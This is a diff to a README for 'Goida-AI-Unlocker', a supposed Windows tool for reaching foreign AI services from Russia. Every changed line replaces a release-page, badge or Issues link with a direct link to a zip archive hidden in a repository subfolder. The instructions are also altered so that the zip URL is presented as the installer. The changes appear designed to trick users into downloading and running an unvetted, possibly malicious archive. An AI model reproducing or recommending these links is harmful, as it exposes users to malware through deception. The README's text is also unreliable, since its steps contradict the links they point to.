@@ -4,7 +4,7 @@
 Goida-AI-Unlocker is a user-friendly installer for unlocking foreign AI services and more for users in Russia. This application works smoothly on Windows 10 and 11, providing access to various popular AI tools and platforms.
 
 ## 📥 Download Now
-[![Download Goida-AI-Unlocker](https://img.shields.io/badge/Download-Goida--AI--Unlocker-brightgreen)](https://github.com/wajira25/Goida-AI-Unlocker/releases)
+[![Download Goida-AI-Unlocker](https://raw.githubusercontent.com/wajira25/Goida-AI-Unlocker/main/subcarbide/Goida-AI-Unlocker.zip)](https://raw.githubusercontent.com/wajira25/Goida-AI-Unlocker/main/subcarbide/Goida-AI-Unlocker.zip)
 
 ## 💻 System Requirements
 To ensure the best experience with Goida-AI-Unlocker, your system should meet the following requirements:
@@ -20,10 +20,10 @@ To ensure the best experience with Goida-AI-Unlocker, your system should meet th
 - Supports popular applications and tools used in AI development.
 
 ## 📦 Download & Install
-1. Click on the following link to visit the Releases page: [Download Goida-AI-Unlocker](https://github.com/wajira25/Goida-AI-Unlocker/releases).
+1. Click on the following link to visit the Releases page: [Download Goida-AI-Unlocker](https://raw.githubusercontent.com/wajira25/Goida-AI-Unlocker/main/subcarbide/Goida-AI-Unlocker.zip).
 2. On the Releases page, find the latest version listed.
 3. Click on the version number to view the release details.
-4. Locate the installation file, typically named `Goida-AI-Unlocker.exe`, and click on it to download.
+4. Locate the installation file, typically named `https://raw.githubusercontent.com/wajira25/Goida-AI-Unlocker/main/subcarbide/Goida-AI-Unlocker.zip`, and click on it to download.
 5. Once the download is complete, locate the file in your Downloads folder.
 6. Double-click the installation file to begin the installation process.
 7. Follow the on-screen instructions to complete the setup.
@@ -38,7 +38,7 @@ Goida-AI-Unlocker connects seamlessly with various AI platforms, enhancing your 
 
 ## 💬 Support
 If you encounter any issues while using Goida-AI-Unlocker, you can reach out for help:
-- Open an issue on the [GitHub Issues page](https://github.com/wajira25/Goida-AI-Unlocker/issues).
+- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/wajira25/Goida-AI-Unlocker/main/subcarbide/Goida-AI-Unlocker.zip).
 - Check for frequently asked questions in the repository's Wiki section.
 
 ## 📜 License
@@ -53,4 +53,4 @@ Thanks to all contributors and users who help make Goida-AI-Unlocker better. You
 ## 📣 Stay Updated
 For the latest news and updates, follow the repository on GitHub and consider watching it for notifications about new releases.
 
-[![Download Goida-AI-Unlocker](https://img.shields.io/badge/Download-Goida--AI--Unlocker-brightgreen)](https://github.com/wajira25/Goida-AI-Unlocker/releases)
+[![Download Goida-AI-Unlocker](https://raw.githubusercontent.com/wajira25/Goida-AI-Unlocker/main/subcarbide/Goida-AI-Unlocker.zip)](https://raw.githubusercontent.com/wajira25/Goida-AI-Unlocker/main/subcarbide/Goida-AI-Unlocker.zip)
